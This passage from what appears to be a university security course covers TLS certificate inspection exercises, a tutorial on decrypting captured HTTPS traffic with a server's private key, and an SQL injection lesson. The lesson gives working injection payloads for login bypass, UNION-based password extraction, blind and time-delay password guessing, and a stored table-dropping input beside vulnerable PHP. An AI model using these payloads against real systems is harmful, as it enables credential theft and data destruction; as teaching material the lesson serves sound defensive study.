Use:</p><ul><li><a href=https://www.ssllabs.com/ssltest/>SSL Server Test from SSL Labs</a> in a web browser</li><li><a href=https://testssl.sh/>testssl.sh</a> in the command line</li></ul><p>Investigate the following websites:</p><ul><li><a href=https://curs.upb.ro/>https://curs.upb.ro/</a></li><li><a href=https://ing.ro/>https://ing.ro/</a></li><li><a href=https://senat.ro/>https://senat.ro/</a></li><li><a href=https://republica.ro/>https://republica.ro/</a></li><li><a href=https://www.emag.ro/>https://www.emag.ro/</a></li></ul><p>Look for the following:</p><ul><li>the overall grade</li><li>reasons for not getting the maximum grade</li><li>certificate expiration date</li><li>certification authority (CA)</li><li>SSL/TLS version supported</li></ul><p>Fill the information above in a Google spreadsheet, a copy of <a href="https://docs.google.com/spreadsheets/d/1ufpcQcwSL3LEziqg5tjBK-e7B2xVq0N5xiRcq9yeRHY/edit?usp=sharing">this one</a>.</p><h3 id=02-investigate-remote-ssltls-certificates>02. Investigate Remote SSL/TLS Certificates</h3><p>Download, inspect and verify remote certificates.
Use <code>openssl s_client</code> to download a certificate.
Use <code>openssl x509</code> to investigate the downloaded certificate.
Use the Certificate Manager-like interface in you browser to extract the corresponding root certificates.
Use <code>openssl verify</code> to verify a certificate;
use the extracted root certificate.</p><p>Investigate the following websites:</p><ul><li><a href=https://slack.com/>https://slack.com/</a></li><li><a href=https://www.pornhub.com/>https://www.pornhub.com/</a></li><li><a href=https://www.emag.ro/>https://www.emag.ro/</a></li></ul><h3 id=03-investigate-remote-ssltls-certificates-with-sni>03. Investigate Remote SSL/TLS Certificates with SNI</h3><p>Download, inspect and verify remote certificates.</p><p>Investigate the following websites:</p><ul><li><a href=https://koala.cs.pub.ro>https://koala.cs.pub.ro</a></li><li><a href=https://security.cs.pub.ro>https://security.cs.pub.ro</a></li><li><a href=https://wiki.cs.pub.ro>https://wiki.cs.pub.ro</a></li></ul><p>These websites are colocated on the same IP address:</p><pre tabindex=0><code>$ host security.cs.pub.ro
security.cs.pub.ro has address 141.85.227.114
security.cs.pub.ro mail is handled by 5 security.cs.pub.ro.

$ host koala.cs.pub.ro
koala.cs.pub.ro has address 141.85.227.114

$ host wiki.cs.pub.ro
wiki.cs.pub.ro is an alias for koala.cs.pub.ro.
koala.cs.pub.ro has address 141.85.227.114
</code></pre><p>So be sure to use <a href=https://major.io/2012/02/07/using-openssls-s_client-command-with-web-servers-using-server-name-indication-sni/>SNI support</a> (<em>Server Name Indication</em>) for the <code>openssl s_client</code> command to download the correct certificate.
This means using the <code>-servername</code> option.</p><h3 id=04-inspect-me-pem>04. Inspect Me PEM</h3><p>Get the flag from the certificate: <a href=https://sss-web.cyberedu.ro/challenge/25d5c870-fc5a-11ec-bf6f-33097481169b>https://sss-web.cyberedu.ro/challenge/25d5c870-fc5a-11ec-bf6f-33097481169b</a></p><h3 id=05-inspect-me-der>05. Inspect Me DER</h3><p>Get the flag from the certificate: <a href=https://sss-web.cyberedu.ro/challenge/82120dc0-fc5a-11ec-8907-a767cfc56b45>https://sss-web.cyberedu.ro/challenge/82120dc0-fc5a-11ec-8907-a767cfc56b45</a></p><h3 id=06-the-chosen-one>06. The Chosen One</h3><p>Find the correct certificate and get the flag from it: <a href=https://sss-web.cyberedu.ro/challenge/38b30e80-fc68-11ec-9c1f-6177b11a278c>https://sss-web.cyberedu.ro/challenge/38b30e80-fc68-11ec-9c1f-6177b11a278c</a></p><h3 id=07-proper-naming>07. Proper Naming</h3><p>Get the flag from http://141.85.224.117:3280
Submit the flag to: <a href=https://sss-web.cyberedu.ro/challenge/32215080-fc7b-11ec-940b-ad7b1c8e700c>https://sss-web.cyberedu.ro/challenge/32215080-fc7b-11ec-940b-ad7b1c8e700c</a></p><h3 id=08-inside>08. Inside</h3><p>Get the flag from http://141.85.224.117:3380
Submit the flag to: <a href=https://sss-web.cyberedu.ro/challenge/298a4d30-fc85-11ec-9624-c3b4658b387a>https://sss-web.cyberedu.ro/challenge/298a4d30-fc85-11ec-9624-c3b4658b387a</a></p><h3 id=09-only-for-members>09. Only for Members</h3><p>Connect via HTTPS to a https://141.85.224.117:31443.
Use client certificate authentication to retrieve the flag.</p><p>The client certificate needs to be signed by the same certification authority as that of the server.
See the files and scripts in the <code>securing-communication/assets/ca/</code> folder in the repository.</p><p>Submit flag to: <a href=https://sss-web.cyberedu.ro/challenge/c8d977d0-fc9c-11ec-80d9-0de38261593f>https://sss-web.cyberedu.ro/challenge/c8d977d0-fc9c-11ec-80d9-0de38261593f</a></p><h3 id=extra-tutorial-inspect-https-traffic>Extra: Tutorial: Inspect HTTPS Traffic</h3><p>In this tutorial challenge, we capture and aim to decrypt HTTPS traffic.
We use Wireshark to capture traffic.</p><p>To decrypt traffic, we need to have access to the private key of the server.
Copy the contents of the private key from the Nginx server set up above, from the <code>/etc/letsencrypt/live/&lt;hostname>/privkey.pem</code> into a local file.</p><p>Start Wireshark (as <code>root</code>).
Load the private key in Wireshark using instructions <a href=https://accedian.com/blog/how-to-decrypt-an-https-exchange-with-wireshark/>here</a>.</p><p>Start packet capture in Wireshark and filter packets to / from the IP address of the server.
Use a string such as <code>ip.addr = &lt;server_IP_address></code> in the filter line in Wireshark.</p><p>Use <code>curl</code> to request the index page from the server:</p><pre tabindex=0><code>curl https://&lt;hostname&gt;
</code></pre><p>Packet capture in Wireshark will not show decrypted content, similar to the image below.</p><p><img src=https-capture-decrypt/wireshark-no-decrypt.png alt="HTTPS not decrypted"></p><p>This is because, by default, the connection uses SSL / TLS ciphers with <a href=https://en.wikipedia.org/wiki/Forward_secrecy>PFS</a> (<em>Perfect Forward Secrecy</em>) usually enabled with DHE (<em>Diffie-Hellman Exchange</em>).
Don&rsquo;t bother with the acronyms and their significance, we use them to let you know the terms and maybe look for additional information later on.</p><p>However, we can request <code>curl</code> to not use PFS, by choosing a simpler cipher.
This simple cipher will use the private key that we are in possession of (and that we loaded into Wireshark) to encrypt traffic.
This is also explained <a href=https://accedian.com/blog/how-to-decrypt-an-https-exchange-with-wireshark/>here</a>.</p><p>Use <code>curl</code> to request the index page from the server with a simpler cipher that does not use DHE:</p><pre tabindex=0><code>curl --ciphers AES256-SHA https://&lt;hostname&gt;
</code></pre><p>Now, the packet capture shows actual decrypted HTTP content, similar to the image below.</p><p><img src=https-capture-decrypt/wireshark-decrypt.png alt="HTTPS decrypted"></p><p>You can use <code>Right click</code> -> <code>Follow</code> -> <code>HTTP stream</code> to extract the HTTP traffic only.</p><p>In summary, with access to the private key, if the cipher used in the HTTPS connection (HTTP + SSL / TLS) doesn&rsquo;t use DHE, we can decrypt the traffic.
Of course, this requires access to the private key.
In an actual attack this is another part of the attack vector where some server-side vulnerability allows the extraction of the private key.</p><h2 id=resources-and-tools>Resources and Tools</h2><ul><li><a href=https://www.tcpdump.org/>tcpdump</a></li><li><a href=https://www.wireshark.org/>Wireshark</a></li><li><a href=https://www.openssl.org/>openssl</a></li><li><a href=https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs>OpenSSL Essentials</a></li><li><a href=https://www.sslshopper.com/article-most-common-openssl-commands.html>The Most Common OpenSSL Commands</a></li><li><a href=https://geekflare.com/openssl-commands-certificates/>OpenSSL Examples</a></li><li><a href=https://jamielinux.com/docs/openssl-certificate-authority/index.html>OpenSSL Certificate Authority</a></li><li><a href=https://testssl.sh/>testssl.sh</a></li><li><a href=https://www.ssllabs.com/ssltest/>SSL Server Test from SSL Labs</a></li></ul><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://geekflare.com/ssl-test-certificate/>https://geekflare.com/ssl-test-certificate/</a></li><li><a href=https://www.feistyduck.com/library/openssl-cookbook/>https://www.feistyduck.com/library/openssl-cookbook/</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-6d3ea5280422db131d38d303e9ab2bdd>4 -</h1><h1 id=sql-injection>SQL Injection</h1><p>In this session, we&rsquo;ll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p><p><strong>NOTE:</strong></p><p>For this session you&rsquo;ll need to use <a href=https://portswigger.net/burp>Burp Suite</a> so please follow the links in the <a href=#further-reading>Further Reading</a> section to set it up if you haven&rsquo;t done so yet.[<a href=https://portswigger.net/support/configuring-your-browser-to-work-with-burp>2</a>,<a href=https://portswigger.net/support/checking-your-browser-proxy-configuration>3</a>,<a href=https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser>4</a>]</p><h2 id=what-is-sql-injection>What is SQL injection</h2><p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
It generally allows attackers to view data that they are not normally able to retrieve.
This might include data belonging to other users, or any other data that the application itself is able to access.
In many cases, an attacker can modify or delete this data, causing persistent changes to the application&rsquo;s content or behavior.</p><p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure or perform a denial-of-service attack.</p><h3 id=what-is-the-impact-of-a-successful-sql-injection-attack>What is the impact of a successful SQL injection attack?</h3><p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.
Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines.
In some cases, an attacker can obtain a persistent backdoor into an organization&rsquo;s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p><h3 id=sql-injection-examples>SQL injection examples</h3><p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations.
Some common SQL injection examples include:</p><ul><li><strong><a href=##retrieving-hidden-data>Retrieving hidden data</a></strong> - you can modify an SQL query to return additional results.</li><li><strong><a href=##subverting-application-logic>Subverting application logic</a></strong> - you can change a query to interfere with the application&rsquo;s logic.</li><li><strong><a href=##SQL-injection-UNION-attacks>UNION attacks</a></strong> - you can retrieve data from different database tables.</li><li><strong><a href=##Examining-the-database>Examining the database</a></strong> - you can extract information about the version and structure of the database.</li><li><strong><a href=##Blind-SQL-injection>Blind SQL injection</a></strong> - the results of a query you control are not returned in the application&rsquo;s responses.</li></ul><hr><h2 id=retrieving-hidden-data>Retrieving hidden data</h2><p>Consider a shopping application that displays products in different categories.
When the user clicks on the Gifts category, their browser requests the URL:</p><p><code>https://insecure-website.com/products?category=Gifts</code></p><p>This causes the application to make an SQL query to retrieve details of the relevant products from the database:</p><p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p><p>This SQL query asks the database to return:</p><ul><li>all details (*)</li><li>from the products table</li><li>where the category is Gifts</li><li>and released is 1.</li></ul><p>The restriction <code>released = 1</code> is being used to hide products that are not released.
For unreleased products, presumably <code>released = 0</code>.</p><p>The application doesn&rsquo;t implement any defenses against SQL injection attacks, so an attacker can construct an attack like:</p><p><code>https://insecure-website.com/products?category=Gifts'--</code></p><p>This results in the SQL query:</p><p><code>SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1</code></p><p>The key thing here is that the double-dash sequence <code>--</code> is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment.
This effectively removes the remainder of the query, so it no longer includes <code>AND released = 1</code>.
This means that all products are displayed, including unreleased products.</p><p>Going further, an attacker can cause the application to display all the products in any category, including categories that they don&rsquo;t know about:</p><p><code>https://insecure-website.com/products?category=Gifts'+OR+1=1--</code></p><p>This results in the SQL query:</p><p><code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1</code></p><p>The modified query will return all items where either the category is Gifts, or 1 is equal to 1.
Since 1=1 is always true, the query will return all items.</p><h2 id=subverting-application-logic>Subverting application logic</h2><p>Consider an application that lets users log in with a username and password.
If a user submits the username <code>wiener</code> and the password <code>bluecheese</code>, the application checks the credentials by performing the following SQL query:</p><p><code>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</code></p><p>If the query returns the details of a user, then the login is successful.
Otherwise, it is rejected.</p><p>Here, an attacker can log in as any user without a password simply by using the SQL comment sequence <code>--</code> to remove the password check from the <code>WHERE</code> clause of the query.
For example, submitting the username <code>administrator'--</code> and a blank password results in the following query:</p><p><code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''</code></p><p>This query returns the user whose username is <code>administrator</code> and successfully logs the attacker in as that user.</p><h2 id=retrieving-data-from-other-database-tables>Retrieving data from other database tables</h2><p>In cases where the results of an SQL query are returned within the application&rsquo;s responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.
This is done using the <code>UNION</code> keyword, which lets you execute an additional <code>SELECT</code> query and append the results to the original query.</p><p>For example, if an application executes the following query containing the user input &ldquo;Gifts&rdquo;:</p><p><code>SELECT name, description FROM products WHERE category = 'Gifts'</code></p><p>then an attacker can submit the input:</p><p><code>' UNION SELECT username, password FROM users--</code></p><p>This will cause the application to return all usernames and passwords along with the names and descriptions of products.</p><h2 id=sql-injection-union-attacks>SQL injection UNION attacks</h2><p>When an application is vulnerable to SQL injection and the results of the query are returned within the application&rsquo;s responses, the <code>UNION</code> keyword can be used to retrieve data from other tables within the database.
This results in an SQL injection UNION attack.</p><p>The <code>UNION</code> keyword lets you execute one or more additional <code>SELECT</code> queries and append the results to the original query.
For example:</p><p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p><p>This SQL query will return a single result set with two columns, containing values from columns <code>a</code> and <code>b</code> in <code>table1</code> and columns <code>c</code> and <code>d</code> in <code>table2</code>.</p><p>For a <code>UNION</code> query to work, two key requirements must be met:</p><ul><li>The individual queries must return the same number of columns.</li><li>The data types in each column must be compatible between the individual queries.</li></ul><p>To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements.
This generally involves figuring out:</p><ul><li>How many columns are being returned from the original query?</li><li>Which columns returned from the original query are of a suitable data type to hold the results from the injected query?</li></ul><h3 id=determining-the-number-of-columns-required-in-an-sql-injection-union-attack>Determining the number of columns required in an SQL injection UNION attack</h3><p>When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.</p><p>The first method involves injecting a series of <code>ORDER BY</code> clauses and incrementing the specified column index until an error occurs.
For example, assuming the injection point is a quoted string within the <code>WHERE</code> clause of the original query, you would submit:</p><ul><li><code>' ORDER BY 1--</code></li><li><code>' ORDER BY 2--</code></li><li><code>' ORDER BY 3--</code></li></ul><p>etc.</p><p>This series of payloads modifies the original query to order the results by different columns in the result set.
The column in an <code>ORDER BY</code> clause can be specified by its index, so you don&rsquo;t need to know the names of any columns.
When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:</p><p><code>The ORDER BY position number 3 is out of range of the number of items in the select list.</code></p><p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results.
Provided you can detect some difference in the application&rsquo;s response, you can infer how many columns are being returned from the query.</p><p>The second method involves submitting a series of <code>UNION SELECT</code> payloads specifying a different number of null values:</p><ul><li><code>' UNION SELECT NULL--</code></li><li><code>' UNION SELECT NULL,NULL--</code></li><li><code>' UNION SELECT NULL,NULL,NULL--</code></li></ul><p>etc.</p><p>If the number of nulls does not match the number of columns, the database returns an error, such as:</p><p><code>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</code></p><p>Again, the application might actually return this error message, or might just return a generic error or no results.
When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.
The effect on the resulting HTTP response depends on the application&rsquo;s code.
If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table.
Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>.
Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.</p><p><strong>NOTE:</strong></p><ul><li>The reason for using <code>NULL</code> as the values returned from the injected <code>SELECT</code> query is that the data types in each column must be compatible between the original and the injected queries.
Since <code>NULL</code> is convertible to every commonly used data type, using <code>NULL</code> maximizes the chance that the payload will succeed when the column count is correct.</li><li>In Oracle, every <code>SELECT</code> query must use the FROM keyword and specify a valid table.
There is a built-in table in Oracle called <code>DUAL</code> which can be used for this purpose.
So the injected queries in Oracle would need to look like: <code>' UNION SELECT NULL FROM DUAL--</code>.</li><li>The payloads described use the double-dash comment sequence <code>--</code> to comment out the remainder of the original query following the injection point.
In MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character <code>#</code> can be used to identify a comment.</li></ul><p>For more details of database-specific syntax, see the <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>SQL injection cheat sheet</a>.</p><h3 id=finding-columns-with-a-useful-data-type-in-an-sql-injection-union-attack>Finding columns with a useful data type in an SQL injection UNION attack</h3><p>The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query.
Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.</p><p>Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of <code>UNION SELECT</code> payloads that place a string value into each column in turn.
For example, if the query returns four columns, you would submit:</p><ul><li><code>' UNION SELECT 'a',NULL,NULL,NULL--</code></li><li><code>' UNION SELECT NULL,'a',NULL,NULL--</code></li><li><code>' UNION SELECT NULL,NULL,'a',NULL--</code></li><li><code>' UNION SELECT NULL,NULL,NULL,'a'--</code></li></ul><p>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:</p><p><code>Conversion failed when converting the varchar value 'a' to data type int.</code></p><p>If an error does not occur, and the application&rsquo;s response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.</p><h3 id=using-an-sql-injection-union-attack-to-retrieve-interesting-data>Using an SQL injection UNION attack to retrieve interesting data</h3><p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.</p><p>Suppose that:</p><ul><li>The original query returns two columns, both of which can hold string data.</li><li>The injection point is a quoted string within the <code>WHERE</code> clause.</li><li>The database contains a table called <code>users</code> with the columns <code>username</code> and <code>password</code>.</li></ul><p>In this situation, you can retrieve the contents of the <code>users</code> table by submitting the input:</p><p><code>' UNION SELECT username, password FROM users--</code></p><p>Of course, the crucial information needed to perform this attack is that there is a table called <code>users</code> with two columns called <code>username</code> and <code>password</code>.
Without this information, you would be left trying to guess the names of tables and columns.
In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.</p><h3 id=retrieving-multiple-values-within-a-single-column>Retrieving multiple values within a single column</h3><p>In the preceding example, suppose instead that the query only returns a single column.</p><p>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values.
For example, in Oracle you could submit the input:</p><p><code>' UNION SELECT username || '~' || password FROM users--</code></p><p>This uses the double-pipe sequence <code>||</code> which is a string concatenation operator in Oracle.
The injected query concatenates together the values of the <code>username</code> and <code>password</code> fields, separated by the <code>~</code> character.</p><p>The results from the query will let you read all of the usernames and passwords, for example:</p><pre tabindex=0><code>...
administrator~s3cure
wiener~peter
carlos~montoya
...
</code></pre><p>Note that different databases use different syntax to perform string concatenation.
For more details, see the <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>SQL injection cheat sheet</a>.</p><h2 id=examining-the-database>Examining the database</h2><p>Following the initial identification of an SQL injection vulnerability, it is generally useful to obtain some information about the database itself.
This information can often pave the way for further exploitation.</p><p>You can query the version details for the database.
The way that this is done depends on the database type, so you can infer the database type from whichever technique works.
For example, in Oracle you can execute:</p><p><code>SELECT * FROM v$version</code></p><p>You can also determine what database tables exist, and which columns they contain.
For example, on most databases you can execute the following query to list the tables:</p><p><code>SELECT * FROM information_schema.tables</code></p><h3 id=querying-the-database-type-and-version>Querying the database type and version</h3><p>Different databases provide different ways of querying their version.
You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.</p><p>The queries to determine the database version for some popular database types are as follows:</p><table><thead><tr><th>Database type</th><th>Query</th></tr></thead><tbody><tr><td>Microsoft, MySQL</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>SELECT * FROM v$version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table><p>For example, you could use a <code>UNION</code> attack with the following input:</p><p><code>' UNION SELECT @@version--</code></p><p>This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:</p><pre tabindex=0><code>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)
</code></pre><h2 id=blind-sql-injection>Blind SQL injection</h2><p>In this section, we&rsquo;ll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities.</p><h3 id=what-is-blind-sql-injection>What is blind SQL injection?</h3><p>Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p><p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective, because they rely on being able to see the results of the injected query within the application&rsquo;s responses.
It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.</p><h3 id=exploiting-blind-sql-injection-by-triggering-conditional-responses>Exploiting blind SQL injection by triggering conditional responses</h3><p>Consider an application that uses tracking cookies to gather analytics about usage.
Requests to the application include a cookie header like this:</p><p><code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></p><p>When a request containing a <code>TrackingId</code> cookie is processed, the application determines whether this is a known user using an SQL query like this:</p><p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code></p><p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user.
However, the application does behave differently depending on whether the query returns any data.
If it returns data (because a recognized <code>TrackingId</code> was submitted), then a &ldquo;Welcome back&rdquo; message is displayed within the page.</p><p>This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition.
To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:</p><p><code>xyz' AND '1'='1</code><br><code>xyz' AND '1'='2</code></p><p>The first of these values will cause the query to return results, because the injected <code>AND '1'='1</code> condition is true, and so the &ldquo;Welcome back&rdquo; message will be displayed.
Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the &ldquo;Welcome back&rdquo; message will not be displayed.
This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.</p><p>For example, suppose there is a table called <code>Users</code> with the columns <code>Username</code> and <code>Password</code>, and a user called <code>Administrator</code>.
We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.</p><p>To do this, we start with the following input:</p><p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm</code></p><p>This returns the &ldquo;Welcome back&rdquo; message, indicating that the injected condition is true, and so the first character of the password is greater than <code>m</code>.</p><p>Next, we send the following input:</p><p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</code></p><p>This does not return the &ldquo;Welcome back&rdquo; message, indicating that the injected condition is false, and so the first character of the password is not greater than <code>t</code>.</p><p>Eventually, we send the following input, which returns the &ldquo;Welcome back&rdquo; message, thereby confirming that the first character of the password is <code>s</code>:</p><p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</code></p><p>We can continue this process to systematically determine the full password for the <code>Administrator</code> user.</p><p><strong>NOTE:</strong></p><p>The <code>SUBSTRING</code> function is called <code>SUBSTR</code> on some types of databases.
For more details, see the <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>SQL injection cheat sheet</a>.</p><h3 id=inducing-conditional-responses-by-triggering-sql-errors>Inducing conditional responses by triggering SQL errors</h3><p>In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data.
The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application&rsquo;s responses.</p><p>In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
Very often, an unhandled error thrown by the database will cause some difference in the application&rsquo;s response (such as an error message), allowing us to infer the truth of the injected condition.</p><p>To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:</p><p><code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a</code>
<code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code></p><p>These inputs use the <code>CASE</code> keyword to test a condition and return a different expression depending on whether the expression is true.
With the first input, the <code>CASE</code> expression evaluates to <code>'a'</code>, which does not cause any error.
With the second input, it evaluates to <code>1/0</code>, which causes a divide-by-zero error.
Assuming the error causes some difference in the application&rsquo;s HTTP response, we can use this difference to infer whether the injected condition is true.</p><p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p><p><code>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a</code></p><h3 id=exploiting-blind-sql-injection-by-triggering-time-delays>Exploiting blind SQL injection by triggering time delays</h3><p>In the preceding example, suppose that the application now catches database errors and handles them gracefully.
Triggering a database error when the injected SQL query is executed no longer causes any difference in the application&rsquo;s response, so the preceding technique of inducing conditional errors will not work.</p><p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition.
Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response.
This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.</p><p>The techniques for triggering a time delay are highly specific to the type of database being used.
On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:</p><p><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--</code>
<code>'; IF (1=1) WAITFOR DELAY '0:0:10'--</code></p><p>The first of these inputs will not trigger a delay, because the condition <code>1=2</code> is false.
The second input will trigger a delay of 10 seconds, because the condition <code>1=1</code> is true.</p><p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p><p><code>'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--</code></p><h3 id=second-order-sql-injection>Second Order SQL Injection</h3><p>A Second Order Injection is the same as a traditional injection attack but the payload is already stored in the database intentionally placed so that it can be triggered in another area of code.</p><p>Let’s look at an example and see how easy it is to exploit this vulnerability.
This is a form of registration that uses parameterization, meaning that a vicious input will not affect the database.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000>$sql</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;INSERT INTO user (username, password)  VALUES (:username, :password)&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000>$data</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>[</span>
</span></span><span style=display:flex><span>        <span style=color:#4e9a06>&#39;username&#39;</span> <span style=color:#ce5c00;font-weight:700>=&gt;</span> <span style=color:#000>$userName</span><span style=color:#000;font-weight:700>,</span>
</span></span><span style=display:flex><span>        <span style=color:#4e9a06>&#39;password&#39;</span> <span style=color:#ce5c00;font-weight:700>=&gt;</span> <span style=color:#000>$password</span><span style=color:#000;font-weight:700>,</span>
</span></span><span style=display:flex><span>        <span style=color:#4e9a06>&#39;first_name&#39;</span> <span style=color:#ce5c00;font-weight:700>=&gt;</span> <span style=color:#000>$firstName</span><span style=color:#000;font-weight:700>,</span>
</span></span><span style=display:flex><span>        <span style=color:#4e9a06>&#39;second_name&#39;</span> <span style=color:#ce5c00;font-weight:700>=&gt;</span> <span style=color:#000>$secondName</span>
</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span><span style=color:#000>$stmt</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$conn</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>prepare</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$sql</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>$stmt</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>execute</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$data</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>Suppose, however, that someone introduces the following structure as a name:</p><p><code>'; DROP TABLE user; --</code></p><p>This will not be a problem for this form, however, this MySQL code is in the database, and if another part of the code uses this name it can be executed.
Let&rsquo;s say that we select the user by name use the following code:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000>$sql</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;SELECT * FROM user WHERE username = &#39;</span><span style=color:#4e9a06>{</span><span style=color:#000>$userName</span><span style=color:#4e9a06>}</span><span style=color:#4e9a06>&#39;&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000>$stmt</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$conn</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>query</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$sql</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>$user</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$stmt</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>fetch</span><span style=color:#000;font-weight:700>();</span>
